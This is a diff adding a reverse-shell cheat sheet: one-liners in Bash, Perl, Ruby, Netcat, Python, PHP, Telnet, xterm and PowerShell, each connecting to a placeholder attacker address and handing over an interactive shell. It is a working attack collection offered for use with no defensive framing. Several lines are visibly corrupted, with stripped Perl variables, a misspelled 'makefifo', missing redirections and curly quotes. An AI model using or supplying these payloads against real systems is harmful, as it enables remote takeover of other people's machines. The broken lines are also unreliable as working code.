@@ -1,0 +1,56 @@
+BASH
+bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1
+0<&196;exec 196<>/dev/tcp/attacker-ip/attacker-port; sh <&196 >&196 2>&196
+
+also you can do this first
+exec 5<>/dev/tcp/attacker-ip/attacker-port
+and then this
+cat <&5 | while read line; do $line 2>&5 >&5; done									
+or this								
+while read line 0<&5; do $line 2>&5 >&5; done
+
+PERL
+
+(Linux)
+perl -e 'use Socket;$i="attacker-ip";$p=attacker-port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -MIO -e '=fork;exit,if();=new IO::Socket::INET(PeerAddr,attacker-ip:attacker-port);STDIN->fdopen(,r);$~->fdopen(,w);systemPERL REVERSE SHELL while<>;'
+(Windows)
+perl -MIO -e '=new IO::Socket::INET(PeerAddr,attacker-ip:attacker-port);STDIN->fdopen(,r);$~->fdopen(,w);systemPERL REVERSE SHELL WINDOWS while<>;'
+
+RUBY 
+
+(Linux)
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new(attacker-ip,attacker-port);while(cmd=c.gets);IO.popen(cmd,r){|io|c.print io.read}end'
+ruby -rsocket -ef=TCPSocket.open("attacker-ip",attacker-port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
+ruby -rsocket -e'f=TCPSocket.open("attacker-ip",attacker-port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+(Windows)
+ruby -rsocket -e 'c=TCPSocket.new(attacker-ip,attacker-port);while(cmd=c.gets);IO.popen(cmd,r){|io|c.print io.read}end'
+
+NETCAT 
+
+(Linux)
+nc -c /bin/sh attacker-ip attacker-port
+/bin/sh | nc attacker-ip attacker-port
+rm -f /tmp/p; mknod /tmp/p p && nc attacker-ip attacker-port 0/tmp/p
+(Windows)
+nc.exe attacker-ip attacker-port -e cmd.exe
+
+PYTHON 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((attacker-ip,attacker-port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-i]);'
+or (Try the second one first)
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('attacker-ip',attacker-port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);'
+PHP 
+php -r $sock=fsockopen("attacker-ip",attacker-port);exec("/bin/sh -i <&3 >&3 2>&3");
+php -r '$sock=fsockopen("attacker-ip",attacker-port);exec("/bin/sh -i <&3 >&3 2>&3");'
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1'");?>
+<?php system (“makefifo /tmp/f/;cat /tmp/f|/bin/sh -i 2>&1|nc attacker-ip attacker-port>/tmp/f"); ?>
+
+TELNET
+rm -f /tmp/p; mknod /tmp/p p && telnet attacker-ip attacker-port 0/tmp/p
+telnet attacker-ip 4444 | /bin/bash | telnet attacker-ip 4445   # Remember to listen both on 4444 and 4445
+
+XTERM
+xterm -display attacker-ip:attacker-port
+
+POWERSHELL
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("attacker-ip",attacker-port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
